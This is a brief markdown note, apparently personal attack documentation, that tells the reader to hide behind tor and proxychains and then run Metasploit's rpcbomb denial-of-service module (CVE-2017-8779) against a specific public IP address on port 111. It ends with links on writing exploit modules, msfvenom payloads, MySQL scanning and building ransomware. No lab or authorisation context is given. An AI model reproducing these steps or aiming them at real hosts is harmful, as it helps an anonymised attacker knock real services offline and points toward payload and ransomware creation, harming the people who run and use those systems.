# Attacks 

Documentation on how to attack services

## Before Attacking 

use tor first then proxychains 
First Terminal
`tor`

Second terminal
`proxychains <program>`

## CVE-2017-8779

### RPCbind port 

Open the Metasploit framework and type 'use auxiliary/dos/rpc/rpcbomb'
set RHOSTS to 149.56.38.19 and RPORT to 111
Type 'exploit'

### Impact

An attacker could use this vulnerability to trigger large unfreed memory allocations on the system leading to a remote Denial of Service.


## References

WRITING AN EXPLOIT MODULE
- https://www.offensive-security.com/metasploit-unleashed/shell/

MSFVENOM
- https://www.offensive-security.com/metasploit-unleashed/msfvenom/

MYSQL
- https://www.offensive-security.com/metasploit-unleashed/scanner-mysql-auxiliary-modules/

Ransomware
- https://www.sentinelone.com/blog/build-your-own-ransomware-project-root-behind-enemy-lines-part-2/